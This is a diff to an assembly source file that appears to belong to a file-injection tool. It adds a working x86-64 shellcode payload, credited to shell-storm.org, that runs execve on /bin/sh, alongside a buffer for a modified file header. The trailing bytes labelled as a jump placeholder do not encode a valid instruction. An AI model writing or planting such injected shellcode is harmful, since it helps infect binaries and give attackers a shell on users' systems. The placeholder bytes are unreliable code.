@@ -23,17 +23,18 @@ section .data
     miss_msg db "The provided file does not exist.", 10
     miss_len equ $ - miss_msg
 
-    ; Injection
-    shellcode db 'xor eax, eax', 10
-        db 'xor ebx, ebx', 10
-        db 'push eax', 10
-        db 'push 0x68732f6e', 10
-        db 'push 0x69622f2f', 10
-        db 'push esp', 10
-        db 'mov ebx, esp', 10
-        db 'xor ecx, ecx', 10
-        db 'xor edx, edx', 10
-        db 'execve syscall numbers'
+    ; Using https://shell-storm.org/shellcode/files/shellcode-603.html
+    shellcode db 0x48, 0x31, 0xD2
+        db 0x48, 0xBB, 0x2F, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68
+        db 0x48, 0xC1, 0xEB, 0x08
+        db 0x53
+        db 0x48, 0x89, 0xE7
+        db 0x50
+        db 0x57
+        db 0x48, 0x89, 0xE6
+        db 0xB0, 0x3B
+        db 0x0F, 0x05
+        db 0xFF, 0x00, 0x00, 0x00, 0x00 ; Jump to 0x00000000 (placeholder)
     shellcode_len equ $ - shellcode
     modified_header times buffer_len db 0
 
